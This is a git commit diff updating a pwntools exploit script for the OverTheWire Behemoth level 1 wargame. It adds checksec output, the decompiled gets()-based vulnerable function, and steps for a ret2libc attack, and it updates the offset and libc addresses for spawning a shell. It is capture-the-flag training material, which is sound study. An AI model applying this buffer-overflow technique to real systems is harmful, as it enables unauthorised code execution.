334d266a3ce41f18485670f60df816daab5e7b94
Christopher Pritchard <chris@grislygrotto.nz>
2024-01-16 20:32:08 +1300

    Update behemoth1.py

--- over-the-wire/Behemoth/behemoth1.py
+++ over-the-wire/Behemoth/behemoth1.py
@@ -1,9 +1,38 @@
 from pwn import *
 
+'''
+checksec /behemoth/behemoth1
+[*] '/behemoth/behemoth1'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x8048000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+
+undefined4 main(void)
+{
+  char local_47 [67];
+  
+  printf("Password: ");
+  gets(local_47);
+  puts("Authentication failure.\nSorry.");
+  return 0;
+}
+
+Basic ret2libc:
+
+libc:        ldd /behemoth/behemoth1
+system:      readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+/bin/sh:     strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+'''
+
 offset = 71
-libc = 0xf7e12000
-system = 0x3a850
-binsh = 0x15ccc8
+# below can change as system is updated
+libc = 0xf7c00000
+system = 0x48170
+binsh = 0x1bd0f5
 
 payload = flat(
     offset*b'A',
